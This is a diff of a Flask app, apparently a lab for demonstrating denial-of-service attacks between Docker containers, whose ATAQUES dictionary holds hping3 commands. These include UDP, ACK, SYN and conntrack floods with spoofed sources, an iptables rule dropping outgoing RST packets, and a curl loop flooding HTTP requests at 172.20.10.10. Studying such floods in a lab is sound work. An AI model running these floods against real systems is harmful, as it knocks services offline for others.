@@ -5,10 +5,12 @@ app = Flask(__name__)
 
 ATAQUES = {
     # Capa 4: UDP Flood (Satura el ancho de banda)
-    "udp": "docker exec atacante hping3 --udp -d 1000 -p 80 --flood --rand-source 172.20.10.10",
+    "ack": "docker exec atacante hping3 -A -p 80 --flood --rand-source 172.20.10.10",
 
     # Capa 4: SYN Flood LETAL (Bloquea RSTs salientes y ataca con la IP real)
-    "syn": "docker exec atacante iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP && docker exec atacante hping3 -S -p 80 --flood 172.20.10.10",
+    "syn": "docker exec atacante hping3 -S -p 80 --flood --rand-source 172.20.10.10",
+
+    "conntrack": "docker exec atacante hping3 -S -p 80 --flood --rand-source --keep 172.20.10.10",
     
     "http": "docker exec atacante sh -c 'for i in $(seq 1 20); do while true; do curl -s http://172.20.10.10 -o /dev/null; done & done; wait'",
     
